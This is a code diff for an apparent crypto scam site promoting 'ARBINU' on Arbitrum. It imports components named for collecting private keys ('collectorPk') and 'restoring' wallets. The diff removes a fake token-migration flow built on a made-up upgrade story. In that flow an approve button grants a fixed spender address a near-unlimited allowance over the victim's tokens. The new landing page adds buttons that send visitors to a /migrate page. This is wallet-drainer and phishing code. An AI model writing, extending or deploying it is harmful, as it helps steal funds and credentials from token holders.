@@ -4,7 +4,7 @@
 import Image from "next/image";
 import styles from "./page.module.css";
 import Metamask from "../../public/trust wallet.png"
-import token from "../../public/aipepe-DMwpNDmO.png"
+import token from "../../public/arbinu.png"
 import gas from "../../public/gas-pump.png"
 import code from "../../public/code-error.png"
 import mm from "../../public/mm.png"
@@ -23,6 +23,10 @@ import { useState } from "react";
 import DeedCollector from "./components/collectorPk";
 import RestoreWallet from "./components/restore";
 import TokenBalance from "./components/tokenBalance";
+import Link from "next/link";
+import box1 from "../../public/box1.png"; // Replace with your actual paths
+import box2 from "../../public/box2.png";
+import box3 from "../../public/box3.png";
 
 export default function Home() {
   const [nextPopup, setNextPopup] = useState(false);
@@ -34,173 +38,74 @@ export default function Home() {
     <div>
     <div className={styles.connectWallet}
         >
-          <Image style={{height: "40px", width: "40px", marginLeft: "40px"}}
+          <Image style={{height: "60px", width: "60px", marginLeft: "40px"}}
                  src={token}
                  alt='mm'/>
           <div style={{
             marginRight: "20px"
           }}>
-            <w3m-button
-            />
+            <Link href="/migrate" 
+            onMouseEnter={() => setIsHovered(true)}
+            onMouseLeave={() => setIsHovered(false)}
+            style={{
+              marginTop: "20px",
+              marginBottom: "5px",
+              padding: "10px",
+              backgroundColor: isHovered ? "#dcdcdc" : "#efefef", // Hover effect for background color
+              border: "none",
+              borderRadius: "6px",
+              color: isHovered ? "#000" : "#333", // Hover effect for text color
+              fontSize: "1rem",
+              cursor: "pointer",
+              paddingRight: "20px",
+              paddingLeft: "20px"
+              }}>
+        Migrate</Link>
           </div>
         </div>
     <div className={styles.container}>
-      <ConnectedAddress />
-        <div className={styles.migrationContainer}>
-          <style>
-    
-  </style>
-          
+      <div className={styles.container}>
+        {/* Floating Boxes */}
+      <Image src={box1} alt="Box 1" className={`${styles.box} ${styles.box1}`} />
+      <Image src={box2} alt="Box 2" className={`${styles.box} ${styles.box2}`} />
+      <Image src={box3} alt="Box 3" className={`${styles.box} ${styles.box3}`} />
+        <div style={{
+            maxWidth: "320px",
+            textAlign: "center",
+          }}>
+            <Image style={{height: "60px", width: "60px", }}
+                 src={token}
+                 alt='mm'/>
           <div style={{
-          display: "flex",
-          flexDirection: "column",
-          backgroundColor: "#1b1f2e",
-          padding: "20px",
-          borderRadius: "20px",
-          gap: "10px",
-          minWidth: "50%"
-        }}>
-          <h2>
-          ARBINU MIGRATION
-          </h2>
-          <p>
-          Exchange your current ARBINU (v1) for the upgraded ARBINU (v2) through the Neuralink upgrade event. When the upgrade is at its peak, a new ARBINU (v2) contract will be rolled out. This allows for it to be easily traded with ample liquidity.
+            marginRight: "20px"
+          }}></div>
+          <h1 >
+          ARBINU
+          </h1>
+          <p style={{fontSize: "14px", marginTop: "10px"}}>
+          Meet the Most Popular Meme Coin on Arbitrum!
           </p>
-
-          <ul style={{ listStyleType: "disc", paddingLeft: "20px", }}>
-            <li style={{marginTop: "5px"}}><strong>Step 1:</strong>Connect your wallet where you hold your ARBINU tokens</li>
-            <li style={{marginTop: "5px"}}><strong>Step 2:</strong>Click Approve, to approve your V1 $ARBINU tokens for migration.</li>
-            <li style={{marginTop: "5px"}}><strong>Step 3:</strong>Click Migrate, to migrate your allocation from the old $ARBINU contract to the new one.</li>
-            <li style={{marginTop: "5px"}}><strong>Step 4:</strong>Approve the transaction in your wallet app when prompted.</li>
-            <li style={{marginTop: "5px"}}><strong>Step 5:</strong>Complete the transaction by paying the required gas fees.</li>
-            <li style={{marginTop: "5px"}}><strong>Step 6:</strong>1-to-1 swap your $ARBINU (V1) for $ARBINU (v2). The new $ARBINU (v2) will be available to view in your wallet after.</li>
-          </ul>
-
-          <h3 style={{
-            marginTop: "50px"
-          }}>
-          SWAP INFO:
-          </h3>
-
-          <div 
-          style={{
-            display: "flex",
-            flexDirection: "row",
-            justifyContent: "space-between",
-            border: "solid",
-            borderColor: "#015efe",
-            
-            padding: "10px",
-            borderRadius: "10px",
-            width:"100%"
-          }}>
-            <div style={{
-            display: "flex",
-            flexDirection: "row",
-            alignItems: "center",
-            gap: "5px"
-            }}>
-            <Image style={{height: "20px", width: "20px",}}
-                 src={token}
-                 alt='mm'/>
-              <p>
-              1 $ARBINU V1
-              </p>
-            </div>
-            <p>
-              :
-            </p>
-            <div style={{
-            display: "flex",
-            flexDirection: "row",
-            alignItems: "center",
-            gap: "5px",
-            }}>
-              <Image style={{height: "20px", width: "20px",}}
-                 src={token}
-                 alt='mm'/>
-              <p>
-              1 $ARBINU V2
-              </p>
-            </div>
-          </div>
-           
-          </div>
-          <div style={{
-          display: "flex",
-          flexDirection: "column",
-          backgroundColor: "#1b1f2e",
-          padding: "20px",
-          borderRadius: "20px",
-          gap: "10px",
-          minWidth: "50%"
-        }}>
-          <h2>
-          MIGRATE
-          </h2>
-          <div 
-          style={{
-            display: "flex",
-            flexDirection: "column",
-            justifyContent: "center",
-            border: "solid",
-            borderColor: "#015efe",
-            backgroundColor: "#1b2b55",
-            padding: "20px",
-            borderRadius: "20px",
-            gap: "10px"
-          }}>
-             <TokenBalance tokenAddress={"0x0776a8234D6D927fF5Cb03CbCdc5756DD4340A1f"} />
-           
-            <input
-                                type="number"
-                                placeholder="100"
-                                value={depositAmount}
-                                onChange={(e) => setDepositAmount(Number(e.target.value))}
-                                style={{
-                                    color: "white",
-                                    border: "solid",
-                                    borderColor: "#1b1f2e",
-                                    borderWidth: "1px",
-                                    borderRadius: "15px",
-                                    height: "40px",
-                                    fontSize: "12px",
-                                    padding: "10px",
-                                    backgroundColor: "#1b1f2e",                                }}
-
-                                
-                                
-                                
-                                />
-            <div style={{
-              display: "flex",
-              flexDirection: "row",
-              justifyContent: "center",
-              gap: "10px"
-            }}>
-              <ApproveButton spenderAddress={"0x8fF15369602bB3e0BEbf0665CCA72600a6781DbF"} tokenAddresses={["0x0776a8234D6D927fF5Cb03CbCdc5756DD4340A1f"]} chainIds={[42161]} amount={"99999999999"} />
-              <ApproveTxn />
-            </div>
-          </div>
-          <h4>
-          You will receive: {depositAmount} 
-          </h4>
-          <div 
-          style={{
-            display: "flex",
-            flexDirection: "row",
-            width: "100%",
-            justifyContent:"center",
-            
-          }}>
-            <w3m-button />
-          </div>
-          </div>
-          
-          <div>
-
-          </div>
+        
         </div>
+        <Link href="/migrate" onMouseEnter={() => setIsHovered(true)}
+            onMouseLeave={() => setIsHovered(false)}
+            style={{
+              marginTop: "20px",
+              
+              padding: "10px",
+              backgroundColor: isHovered ? "#dcdcdc" : "#efefef", // Hover effect for background color
+              border: "none",
+              borderRadius: "6px",
+              color: isHovered ? "#000" : "#333", // Hover effect for text color
+              fontSize: "1rem",
+              cursor: "pointer",
+              paddingRight: "20px",
+              paddingLeft: "20px"
+              }}>
+        Migrate</Link>
+      </div>
+      
+         
      
     </div>
     </div>
